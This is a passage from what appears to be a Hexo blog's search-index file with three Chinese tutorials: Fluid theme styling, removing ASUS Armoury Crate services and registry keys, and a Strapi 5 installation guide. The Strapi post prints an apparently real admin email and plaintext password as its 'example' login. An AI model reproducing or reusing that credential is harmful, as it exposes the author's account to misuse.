function_">isExcludedPage</span> = (<span class="params">path</span>) =&gt; {</span><br><span class="line">  <span class="keyword">if</span> (path === <span class="string">"/"</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable constant_">PAGE_EXCLUSIONS</span>.<span class="title function_">some</span>(<span class="function">(<span class="params">excluded</span>) =&gt;</span> path.<span class="title function_">startsWith</span>(excluded));</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>校验语句判断为真返回 <code>true</code> 的。但如果你的网站使用如：</p><ul><li><code>2013/07/14/hello-world/</code></li><li><code>2013-07-14-hello-world.html</code></li><li><code>foo/bar/hello-world/</code></li><li>……</li></ul><p>等等方案，我很难每个都适配，只得你自己进行修改。</p><p>修改其实也很简单，比如日期类的永久链接：<code>/2025/04/26/xxx/</code></p><p>你可以修改 <code>excludePages</code> 中的字符串为正则匹配符：<code>/^\/\d{4}\/\d{2}\/\d{2}\//</code></p><p>校验函数也可以修改为：</p><figure class="highlight js"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用于判断当前页面是否在排除范围内</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">isExcludedPage</span> = (<span class="params">path</span>) =&gt; {</span><br><span class="line">  <span class="keyword">return</span> excludePathPatterns.<span class="title function_">some</span>(<span class="function"><span class="params">pattern</span> =&gt;</span> pattern.<span class="title function_">test</span>(path));</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p>总之，方法有很多。如果你没有这方面的基础，你也可以借助 AI 工具实现。当然，如果你的网站刚建立，更换永久链接是一件损失非常小的事情，如果你不想折腾的话，你也可以更换永久链接来适配代码。</p><div class="note warning flat"><p>⚠️ 注意：<br>更换永久链接意味着您的网站在各搜索引擎中的收录索引将会失效，重新索引可能需要一段时间，重新索引完成的时间将取决于您网站的流量高低。当然，您也可以手动前往提交索引请求，但这只是起到告知作用，重新索引完成的时间仍然未知。若您仍不明白这将有何影响，建议您不要更换永久链接。<br>如果您愿意更换永久链接生成方式，想暂时解决搜索引擎索引问题，可以考虑使用 <code>hexo-generator-alias</code> 插件，它可以帮助你实现旧链接重定向到新链接的效果。</p></div><h2 id="毛玻璃底页效果"><a class="markdownIt-Anchor" href="#毛玻璃底页效果"></a> 毛玻璃底页效果</h2><ol><li><p>修改<code>_config.fluid.yml</code> 文件的主面板背景色</p><figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 主面板背景色</span><br><span class="line"># Color of main board</span><br><span class="line"><span class="deletion">-board_color: "#ffffff"</span></span><br><span class="line"><span class="deletion">-board_color_dark: "#252d38"</span></span><br><span class="line"><span class="addition">+board_color: "#ffffff80"</span></span><br><span class="line"><span class="addition">+board_color_dark: "#00000080"</span></span><br></pre></td></tr></tbody></table></figure></li><li><p><code>source/css</code> 目录下新建 <code>glassBg.css</code> 文件</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 正文底页毛玻璃效果 */</span></span><br><span class="line"><span class="selector-id">#board</span> {</span><br><span class="line">  -webkit-backdrop-<span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">10px</span>);</span><br><span class="line">  backdrop-<span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="number">10px</span>);</span><br><span class="line">}</span><br><span class="line"><span class="comment">/* 侧边目录毛玻璃效果 */</span></span><br><span class="line"><span class="selector-id">#toc</span> {</span><br><span class="line">  <span class="attribute">padding</span>: <span class="number">10px</span>;</span><br><span class="line">  <span class="attribute">top</span>: <span class="number">4rem</span>;</span><br><span class="line">  <span class="attribute">background-color</span>: <span class="built_in">var</span>(--board-bg-color);</span><br><span class="line">  <span class="attribute">border-radius</span>: <span class="number">10px</span>;</span><br><span class="line">  -webkit-backdrop-<span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="built_in">var</span>(--background-blur));</span><br><span class="line">  backdrop-<span class="attribute">filter</span>: <span class="built_in">blur</span>(<span class="built_in">var</span>(--background-blur));</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></li></ol><p>侧边的目录区域毛玻璃效果如果不需要可以删除。</p><h2 id="一些好用的插件"><a class="markdownIt-Anchor" href="#一些好用的插件"></a> 一些好用的插件</h2><p>Hexo 官方推荐插件就足够：<a href="https://fluid-dev.github.io/hexo-fluid-docs/advance/#hexo-%E6%8F%92%E4%BB%B6">https://fluid-dev.github.io/hexo-fluid-docs/advance/#hexo - 插件</a></p><h2 id="致谢"><a class="markdownIt-Anchor" href="#致谢"></a> 致谢</h2><p>感谢 <a href="https://github.com/banyee19">@banyee19</a> 在日夜背景图切换方面的探究，我一度以为我的切换效果是正常的，但使用其他设备进行查看后才发现效果无法正确实现，故此重构。</p><p>相关文章：</p><ul><li><a href="https://kznep19.blog/2025/04/26/%E7%99%BD%E5%A4%A9%E9%BB%91%E5%A4%9C%E8%83%8C%E6%99%AF%E5%9B%BE%E5%88%87%E6%8D%A2/">Hexo Fluid 背景图随日夜模式切换</a> by <a href="https://github.com/banyee19">@banyee19</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 美化 </tag>
            
            <tag> Hexo </tag>
            
            <tag> fluid </tag>
            
            <tag> 日夜切换背景 </tag>
            
            <tag> CSS </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华硕奥创中心以及其他服务组件彻底删除卸载</title>
      <link href="/posts/57159.html"/>
      <url>/posts/57159.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="卸载奥创中心"><a class="markdownIt-Anchor" href="#卸载奥创中心"></a> 卸载奥创中心</h2><p>要顺利卸载奥创中心你首先得去官网找到它的官方卸载工具（<a href="https://www.asus.com/supportonly/armoury%20crate/helpdesk_download/">官网在哪？</a>）</p><p>它长这样：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501101729547.png" alt="image-20250110172917459"></p><p>你需要点击下方的 <code>Show all</code> 将其展开，找到 <code>Armour Create Uninstall Tool</code> 工具下载到本地并将其解压：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501101730856.png" alt="image-20250110173033808"></p><p>它目录中应当包含以下文件：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501101731079.png" alt="image-20250110173157054"></p><p>然后按照该工具的提示进行卸载即可。</p><h2 id="卸载残留问题"><a class="markdownIt-Anchor" href="#卸载残留问题"></a> 卸载残留问题</h2><p>不出意外的话往往卸载就出意外了，你会发现卸载后你的任务管理器中还运行着这些服务项：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501101735064.jpeg" alt="img"></p><p>事实上没那么恐怖，这是它的注册表并未删除干净。</p><ul><li><p>Windows7 的用户可以找到计算机右键选择管理（或者 <code>Win+R</code> 输入 <code>services.msc</code> 打开服务），然后在服务列表中将先所有 ASUS 有关的服务全部停止，然后使用命令将其删除：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc delete xxx</span><br></pre></td></tr></tbody></table></figure></li></ul><p>需要注意的是服务名并非列表中展示给你看的名字，而是右键查看属性之后它展示的服务名称：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202501101742169.png" alt="image-20250110174216138"></p><ul><li><p>Windows10 及其以上用户先和 Win7 一样将所有有关的服务项先全部停止，然后 <code>Win+R</code> 输入 <code>regedit</code> 打开注册表编辑器，定位到：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</span><br></pre></td></tr></tbody></table></figure><p>然后对照服务项列表里的服务名将注册表中的文件夹及其子项删除即可。</p></li></ul><p>最后的最后，别忘记重启电脑。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 随想随记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 华硕 </tag>
            
            <tag> 卸载问题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文搞清 Strapi5 的安装与使用 | 踩坑爽 (bushi</title>
      <link href="/posts/45101.html"/>
      <url>/posts/45101.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><blockquote><p>我的 Strapi 版本：v5.0.0</p><p>节点版本：v20.13.1</p><p>数据库：MySQL8</p><table><thead><tr><th>数据库</th><th>受到推崇的</th><th>最低限度</th></tr></thead><tbody><tr><td> MySQL</td><td>8.0</td><td>8.0</td></tr><tr><td> 玛丽亚数据库</td><td> 10.6</td><td>10.5</td></tr><tr><td>PostgreSQL</td><td>14.0</td><td>12.0</td></tr><tr><td>SQLite</td><td>3</td><td>3</td></tr></tbody></table><p>Strapi 官方文档地址：<a href="https://strapi.nodejs.cn/dev-docs/installation/cli">https://strapi.nodejs.cn/dev-docs/installation/cli</a></p></blockquote><h2 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h2><p>本篇文章主要是从安装到使用，说说我在 Windows | WindowsServer 上使用 Strapi5 作后端数据服务器时碰到的一切坑。</p><h2 id="安装-strapi"><a class="markdownIt-Anchor" href="#安装-strapi"></a> 安装 Strapi</h2><h3 id="检查本地环境"><a class="markdownIt-Anchor" href="#检查本地环境"></a> 检查本地环境</h3><p>请转到 <a href="https://strapi.nodejs.cn/dev-docs/installation/cli">Strapi 官方文档</a>，对照官方文档要求检查你本地的 <code>Node.js</code> 和 <code>npm</code> 版本。我的环境如下：</p><ul><li><p>Node.js 版本：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ node -v</span><br><span class="line">v20.13.1</span><br></pre></td></tr></tbody></table></figure></li><li><p>npm 包管理器版本</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ npm -v</span><br><span class="line">10.8.2</span><br></pre></td></tr></tbody></table></figure></li></ul><p>官方文档中使用 Python 是为了支持它默认的 SQLite 数据库，我这里使用的是 PHPStudy 集成的 MySQL8, 数据库，所以 Python 环境是不必须的。</p><blockquote><p>✋ 提醒</p><p>Strapi 不支持 MongoDB。</p></blockquote><h3 id="安装-yarn可选"><a class="markdownIt-Anchor" href="#安装-yarn可选"></a> 安装 yarn（可选）</h3><p>我之后投入了 yarn 的怀抱，所以这里可以安装一下 yarn 作为包管理器，<strong>非必须！</strong></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g yarn</span><br></pre></td></tr></tbody></table></figure><p>卸载命令是</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall yarn -g</span><br></pre></td></tr></tbody></table></figure><p>我的 yarn 版本是</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ yarn -v</span><br><span class="line">1.22.22</span><br></pre></td></tr></tbody></table></figure><h2 id="创建-strapi-项目"><a class="markdownIt-Anchor" href="#创建-strapi-项目"></a> 创建 Strapi 项目</h2><p>在一个你准备好的目录中，使用终端 <code>cmd</code> 或 <code>powershell</code> 执行</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn create strapi</span><br></pre></td></tr></tbody></table></figure><blockquote><p>✋ 注意</p><p>Yarn does not support passing the version tag such as <code>@latest</code>, as opposed to npm. If you experience unexpected results with yarn and the latest version of Strapi is not installed, you might need to <a href="https://yarn.nodejs.cn/cli/cache/clean">run the <code>yarn cache clean</code> command</a> to clean your Yarn cache.</p><p>Yarn 不支持传递版本标签，如 <code>@latest </code>, 这与 npm 相反。如果您在使用 yarn 时遇到意外结果，没有安装最新版本的 Strapi，您可能需要运行 [yarn cache clean](<a href="https://yarn">https://yarn</a> . nodejs . cn/CLI/cache/clean) 命令来清理 Yarn 缓存。</p></blockquote><p>或者使用 npm</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx create-strapi@latest</span><br></pre></td></tr></tbody></table></figure><p>我推荐创建时，使用 npm 以保证安装最新版本的 Strapi</p><p>以下是我的安装选择：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># E:\Coding\StrapiProjects\demo1</span></span><br><span class="line"></span><br><span class="line">$ npx create-strapi@latest</span><br><span class="line">Need to install the following packages:</span><br><span class="line">create-strapi@5.0.5</span><br><span class="line">Ok to proceed? (y) y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> Strapi   v5.0.5 � Let<span class="string">'s create your new project</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">? What is the name of your project? demo1</span></span><br><span class="line"><span class="string">? What is the name of your project? demo1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">We can'</span>t find any auth credentials <span class="keyword">in</span> your Strapi config.</span><br><span class="line"></span><br><span class="line">Create a free account on Strapi Cloud and benefit from:</span><br><span class="line"></span><br><span class="line">- ✦ Blazing-fast ✦ deployment <span class="keyword">for</span> your projects</span><br><span class="line">- ✦ Exclusive ✦ access to resources to make your project successful</span><br><span class="line">- An ✦ Awesome ✦ community and full enjoyment of Strapi<span class="string">'s ecosystem</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Start your 14-day free trial now!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">? Please log in or sign up. Skip</span></span><br><span class="line"><span class="string">? Do you want to use the default database (sqlite) ? (Y/n) n</span></span><br><span class="line"><span class="string">? Choose your default database client mysql</span></span><br><span class="line"><span class="string">? Database name: demo1</span></span><br><span class="line"><span class="string">? Host: localhost</span></span><br><span class="line"><span class="string">? Port: 3306</span></span><br><span class="line"><span class="string">? Username: root</span></span><br><span class="line"><span class="string">? Password: ****</span></span><br><span class="line"><span class="string">? Enable SSL connection: (y/N) N</span></span><br><span class="line"><span class="string">? Start with an example structure &amp; data? (y/N) N</span></span><br><span class="line"><span class="string">? Start with Typescript? (Y/n) n</span></span><br><span class="line"><span class="string">? Install dependencies with npm? (Y/n) Y</span></span><br><span class="line"><span class="string">? Initialize a git repository? (Y/n) n</span></span><br></pre></td></tr></tbody></table></figure><ul><li><code>? Please log in or sign up. Skip</code>：意思是让你进行在线登录，我选择跳过</li><li><code>? Do you want to use the default database (sqlite) ? (Y/n) n</code>：是否使用默认的 sqlite 数据库，我选择否</li><li><code>? Choose your default database client mysql</code>：出现三个选项让你选择，我选择 mysql</li><li><code>? Database name: demo1</code>：输入要连接的数据库名字（准备好一个空表的数据库）</li><li><code>? Host: localhost</code>：数据库的 host 地址，本地就是 localhost，远程填公网 ip</li><li><code>? Port: 3306</code>：数据库端口，我选择默认端口 3306</li><li><code>? Enable SSL connection: (y/N) N</code>：是否启用 SSL 连接？可自行决定（<a href="https://wiki.sqlfans.cn/mysql/mysql-bp-ssl-enable.html">什么是数据库 SSL 连接？</a>）</li><li><code>? Start with an example structure &amp; data? (y/N) N</code>：是否需要安装时附带简单数据？我自行决定数据，所以选否</li><li><code>? Start with Typescript? (Y/n) n</code>：项目需要 TypeScript 吗？可自行决定</li><li><code>? Install dependencies with npm? (Y/n) Y</code>：是否使用 npm 安装依赖？我选择是，省去手动安装依赖的命令</li><li><code>? Initialize a git repository? (Y/n) n</code>：是否初始化一个 git 仓库？可自行决定</li></ul><p>经过些许等待，看到以下画面说明成功了：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111812868.png" alt="image-20241011181201688"></p><p>如果你在安装时选择了不自动安装依赖，进入项目内是没有 node-modules 包的，可手动安装</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></tbody></table></figure><p>安装好依赖之后请先别着急启动，接着看汉化步骤（如果你英语好，也请看看汉化小节的最后，运行命令在那里）</p><h2 id="strapi-汉化"><a class="markdownIt-Anchor" href="#strapi-汉化"></a> Strapi 汉化</h2><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409210045773.png" alt="image-20240921004508650"></p><p>项目运行登录进面板之后点击左下角的 profile 进行设置</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409210109467.png" alt="image-20240921010929358"></p><h2 id="运行-strapi-应用"><a class="markdownIt-Anchor" href="#运行-strapi-应用"></a> 运行 Strapi 应用</h2><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run develop</span><br></pre></td></tr></tbody></table></figure><p>或</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn develop</span><br></pre></td></tr></tbody></table></figure><h2 id="strapi-运行-mysql-建表报错"><a class="markdownIt-Anchor" href="#strapi-运行-mysql-建表报错"></a> Strapi 运行 - MySQL 建表报错</h2><blockquote><p>Error: alter table <code>i18n_locale</code> add index <code>i18n_locale_documents_idx</code>(<code>document_id</code>, <code>locale</code>, <code>published_at</code>)<br>Specified key was too long; max key length is 1000 bytes</p></blockquote><p>类似上述报错，这是因为 MySQL 对于 <a href="https://so.csdn.net/so/search?q=InnoDB%E5%AD%98%E5%82%A8%E5%BC%95%E6%93%8E&amp;spm=1001.2101.3001.7020">InnoDB 存储引擎</a>有一个索引键长度的限制，这个限制基于字符集的不同而不同。在使用 <code>utf8</code> 字符集时，每个字符可能占用 <code>3</code> 个字节，那么对于 <code>innodb</code> 表，索引键的最大长度大约为 <code>1000</code> 个字符左右（因为 <code>3072 / 3 ≈ 1024</code>）。若字符集是 <code>utf8mb4</code>，每个字符可能占用 <code>4</code> 个字节，所以最大长度会进一步减少到 <code>768</code> 个字符左右（<code>3072 / 4 = 768</code>）</p><blockquote><p>uf8mb4 字符集:<br>要在 Mysql 中保存 4 字节长度的 UTF-8 字符，需要使用 utf8mb4 字符集（mb4 就是 most bytes 4 的意思，专门用来兼容四字节的 unicode），但只有 5.5.3 版本以后的才支持。<br>为了获取更好的兼容性，应该总是使用 utf8mb4 而非 utf8. 对于 CHAR 类型数据，utf8mb4 会多消耗一些空间，根据 Mysql 官方建议，使用 VARCHAR 替代 CHAR。其实，utf8mb4 是 utf8 的超集，理论上原来使用 utf8，然后将字符集修改为 utf8mb4，也会不会对已有的 utf8 编码读取产生任何问题。当然，为了节省空间一般情况下使用 utf8 也就够了。</p></blockquote><h3 id="解决办法"><a class="markdownIt-Anchor" href="#解决办法"></a> 解决办法</h3><p>由于我使用的是 PHPstudy 集成的 MySQL8 所以直接找到 PHPstudy 将引擎改为 InnoDB 就好了</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409210102415.png" alt="image-20240921010242363"></p><h2 id="strapi-启动项目登录凭证"><a class="markdownIt-Anchor" href="#strapi-启动项目登录凭证"></a> Strapi 启动项目登录凭证</h2><p>正确启动之后，会自动打开浏览器访问 admin 管理面板的注册页面，请自行注册。</p><p>注册产生的凭证决定你是否能登录上 Strapi 的管理面板，请妥善保存你的登录信息。</p><p>可只保存关键信息，下面是我的示例：</p><table><thead><tr><th>配置项</th><th>值</th></tr></thead><tbody><tr><td> name</td><td>4rozen</td></tr><tr><td> 姓氏</td><td> Chen</td></tr><tr><td> 电子邮件</td><td><code>maril4chen@foxmail.com</code></td></tr><tr><td>密码</td><td> Strapi1005</td></tr></tbody></table><h2 id="了解-strapi-的身份管理机制"><a class="markdownIt-Anchor" href="#了解-strapi-的身份管理机制"></a> 了解 Strapi 的身份管理机制</h2><p>Strapi 可以设置普通注册用户为 Authenticaed 或 public 分组</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409231751921.png" alt="image-20240923175122837" style="zoom:67%;"><p>由于进行普通注册会默认得到 jwt 令牌，所以我们可以设置为 Authenticaed 分组</p><p>这里你一定会疑惑 Strapi 的身份机制到底是什么？</p><p>对普通用户简单来说有以下身份：</p><ol><li>public：未经过身份验证的用户所在分组，访问接口只能访问公共接口</li><li> Authenticaed：经过身份验证的用户所在分组，访问接口更多</li></ol><blockquote><p>身份验证发生在登录或者是注册，能完成其中之一都可以算作身份验证通过</p></blockquote><p>每一个用户登录之前都是 public 用户，在注册后就成为了 Authenticaed user 经过验证的用户。</p><p>Strapi 使用 Roles 来对普通注册的 user 用户进行分组，在 content manager 中有默认创建的 Users 表，可以点击用户进行设置，分为以下身份：</p><ul><li><p>Authenticaed：身份验证通过的用户</p></li><li><p>public：路人</p></li></ul><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409231812271.png" alt="image-20240923181205208"></p><p>Strapi 同样也对通过后台 admin 进行注册的管理员用户使用 Roles 来进行管理，分为：</p><ul><li>Author：作者可以管理他们创建的内容。</li><li>Editor：编辑者可以管理和发布内容，包括其他用户的内容。</li><li>Super Admin：超级用户可以访问和管理所有功能和设置。</li></ul><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409231817758.png" alt="image-20240923181701691"></p><p><strong>第一次注册进来默认是 Super Admin 超级管理员。</strong></p><p>如果有更多人，点击 Administration panel 管理面板中的 Roles 角色可以进行分组管理。</p><h2 id="如何创建表结构"><a class="markdownIt-Anchor" href="#如何创建表结构"></a> 如何创建表结构</h2><p>可能看到上面的身份管理你一脸懵，没关系，我们先来创建一个用于存放商品信息的示例表：</p><ol><li><p>点击左侧侧边栏的 Content-Type Builder 内容构建<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111826492.png" alt="image-20241011182621412"></p></li><li><p>点击 Create new collection type 创建内容集合类型的复杂数据表，这种表结构支持表与表之间的引用关联，这有助于我们创建符合数据要求的数据结构<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111828046.png" alt="image-20241011182837966"></p></li><li><p>填写单数形式的表名，当然复数形式的表名也可以<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111832024.png" alt="image-20241011183217936" style="zoom:67%;"></p></li><li><p>点击 ADVANCED SETTINGS 高级设置<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111834339.png" alt="image-20241011183455258" style="zoom:67%;"></p></li><li><p>点击 Continue 继续，此时需要你进行表的字段设置，比如设置商品名和商品图如下：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111837231.png" alt="image-20241011183733123" style="zoom:67%;"></p><p>具体设置 Text 类型的商品名如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111841019.png" alt="image-20241011184132933" style="zoom:67%;"><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111843156.png" alt="image-20241011184331055" style="zoom:67%;"></p><p>设置商品图片如下：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111845558.png" alt="image-20241011184512477" style="zoom:67%;"><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111846054.png" alt="image-20241011184637966" style="zoom:67%;"><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111847286.png" alt="image-20241011184717164" style="zoom:67%;"></p><p>添加成功之后别忘记点击 Save 保存</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111848805.png" alt="image-20241011184806683"></p><p>之后 Strapi 将进行重启，不出意外将成功创建 Good 数据表和我们刚才添加的字段：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111853588.png" alt="image-20241011185353508"></p></li><li><p>填充数据：点击左侧边栏的 Content Manager 内容管理选择刚才我们创建的数据表 good 并点击右上角的 Create new entry 创建实体就行了。</p></li></ol><h2 id="strapi-接口权限设置"><a class="markdownIt-Anchor" href="#strapi-接口权限设置"></a> Strapi 接口权限设置</h2><p>数据表有了，怎么通过接口调试呢？</p><p>Strapi 的接口要想调试，首先得给予权限。</p><ol><li><p>找到左侧侧边栏的 setting 然后点击 Roles<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111953074.png" alt="image-20241011195314924"></p><p><code>Authenticated</code> 为经过注册等身份验证手段的用户，而 Public 为公共用户。这将以此分割接口权限，<code>Public</code> 为随便就能访问的接口，<code>Authenticated</code> 为身份验证之后才能使用的接口</p></li><li><p>除了登录注册接口，我们可能会希望所有接口能够经过权限验证才能通行。但是我这里为了演示，就将 <code>good</code> 表的接口给 <code>Public</code> 用户开通：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410111958468.png" alt="image-20241011195836369" style="zoom:67%;"><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410112000118.png" alt="image-20241011200008789"></p></li><li><p>别忘记右上角点击保存。我这里直接使用浏览器进行接口测试：</p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202410112008460.png" alt="image-20241011200804395" style="zoom:67%;"></li></ol><p>如果想接口限权，只允许身份验证的用户才能使用的话，就请给 <code>Authenticated</code> 用户开权限而不是 Public</p><h2 id="strapi-接口文档查看"><a class="markdownIt-Anchor" href="#strapi-接口文档查看"></a> Strapi 接口文档查看</h2><blockquote><p>说到接口，这里推荐安装 document 插件进行可视化查看，因为 Strapi 默认不提供可视化的接口文档，只提供接口路由可供查看。</p><p>插件官方文档：<a href="https://docs.strapi.io/dev-docs/plugins/documentation">https://docs.strapi.io/dev-docs/plugins/documentation</a></p></blockquote><p>安装接口文档插件命令</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yarn add @strapi/plugin-documentation</span><br><span class="line"><span class="comment"># 或者npm</span></span><br><span class="line">npm install @strapi/plugin-documentation</span><br></pre></td></tr></tbody></table></figure><p>接口文档访问地址</p><figure class="highlight http"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:1337/documentation/v1.0.0#/</span><br></pre></td></tr></tbody></table></figure><p>其中 Users-Permissions - Auth 为认证用户和普通用户的接口，下面的 User-Permissions 则是管理员端的相关接口。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202409231908943.png" alt="image-20240923190855795"></p><h2 id="配置邮箱发信插件"><a class="markdownIt-Anchor" href="#配置邮箱发信插件"></a> 配置邮箱发信插件</h2><p>Strapi 默认并不会自行配置邮件服务。</p><p>为了能够发送邮件（例如密码重置邮件），需要设置一个邮件提供商（如 SendGrid、Gmail、SMTP 等）。如果没有配置邮件提供商，本地 Strapi 无法实际发送邮件。</p><h3 id="安装-nodemailer-插件"><a class="markdownIt-Anchor" href="#安装-nodemailer-插件"></a> 安装 <code>nodemailer</code> 插件</h3><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># using yarn</span></span><br><span class="line">yarn add @strapi/provider-email-nodemailer</span><br><span class="line"></span><br><span class="line"><span class="comment"># using npm</span></span><br><span class="line">npm install @strapi/provider-email-nodemailer --save</span><br></pre></td></tr></tbody></table></figure><h3 id="配置-email-provider"><a class="markdownIt-Anchor" 